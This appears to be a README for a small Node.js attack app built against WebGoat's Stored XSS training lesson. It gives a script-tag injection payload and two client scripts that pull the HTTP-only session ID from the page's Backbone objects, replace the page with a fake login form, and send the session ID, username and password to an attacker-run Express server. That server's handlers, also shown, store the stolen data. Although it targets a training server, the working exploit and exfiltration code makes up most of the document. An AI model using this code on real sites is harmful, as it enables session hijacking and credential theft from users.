# webGoatHack
A small node.js app for exercising with WebGoat 7.0

# WebGoat
WebGoat is a special web server application for training various security attacks. To read more what is it and how to install it proceed to the [link](https://github.com/WebGoat/WebGoat/)

# Hack App install and run
Please, clone the repo to you computer and then install node dependencies by executing
```
npm install
```
To ran hack application type 
```
npm start
```
The application will starts at `http://localhost:3000/`

# How to perform attack
1. Go to the lesson "Stored XSS" in `Webgoat` Put into the title of the comment this content:
```
Cool site <script src='http://localhost:3000/backdoor.js'></script>
```
2. Run hacking application with `npm start`
3. Open the lesson again. Login into the system. 
4. Open "Stolen information page" via link `http://localhost:3000/outcome`

# Explanation 
The aim of the attack is to get users's session ID, username and password. 

As web server for providing malicious code we use Express application (Express is a popular javascript framework for building web applications)

We came with two level approach because we want to perform attack once per user session and in the same time hide the mechanism of attack from the victim. 
## First level. Script `backdoor.js`
```
var fishing = document.createElement('script')
var cookie = goatRouter.lessonController.cookieView.collection.findWhere({name:'JSESSIONID'}).attributes
fishing.setAttribute('src','http://localhost:3000/fishing.js?session='+cookie.value);
document.body.appendChild(fishing);
```
This script only collects the `JSESSIONID` cookie and sends it as GET parameter. Since the cookies are set to be `HTTP-only` one can't read them directly from `document.cookie` object. So, we read it from `goatRouter` Backbone application (Backbone is a popular front-end javascript framework which is used in `WebGoat`)

On a server this request is processed by the code:
```
app.get('/fishing.js',function(req, res, next){
  if (req.query.session) {
    if (typeof stolenInformation[req.query.session] === 'undefined') {
      res.sendFile(path.resolve('hacks/fishing.js'));
    } else {
      res.send('console.log("Already")');
    }
  }
});
```
We use session value as a key for the `stolenInformation` object. If this property is undefined we send file `fishing.js` which performs phishing attacks. Defined property means that we already performed attack for this session value, so we skip to send malicios code.

## Second level. Script `fishing.js`
This script actually performs attack and sends confidential data to our server. Important note that we don't redirect the user to some other page in the internet, he fills login form staying on the original site (and seeing its url in his browser address field possibly with valid `HTTPS` certificate information).
```
var worm = document.createElement('script')
var cookie = goatRouter.lessonController.cookieView.collection.findWhere({name:'JSESSIONID'}).attributes
var stolenInformation = {};
var bodyBackup;
//
// Open GET request for index page 
$.ajax({
    url:'/WebGoat',
    success: function(data){
        // replace content of body tag with index page login form
        $('body').html(data);
        
        // set a handler for submit button
        $('form').find('button').click(function(e){
            
            // prevent login
            e.preventDefault();
            
            // collect username and password from inputs
            $('.form-control').each(function(item){
                stolenInformation[this.name] = this.value;
            })
            stolenInformation.session = cookie.value;
            
            // send stolenInformation to the server as GET parameters
            worm.setAttribute('src','http://localhost:3000/final.js?'
                +'session='+stolenInformation.session
                +'&username='+stolenInformation.username
                +'&password='+stolenInformation.password);
            document.body.appendChild(worm);
            
            // reload the page
            window.location.reload();

        })
    }
});
```
We save stolen information on a server with a script:
```
app.get('/final.js',function(req, res, next){
  if (req.query.session) {
    if (typeof stolenInformation[req.query.session] === 'undefined') {
      stolenInformation[req.query.session] = {
        session: req.query.session,
        username: req.query.username,
        password: req.query.password
      }
      res.send('console.log('hacked')');
    }
  }
});
```
`stolenInformation` object is stored inside of hack application and can be used whatever we what. 



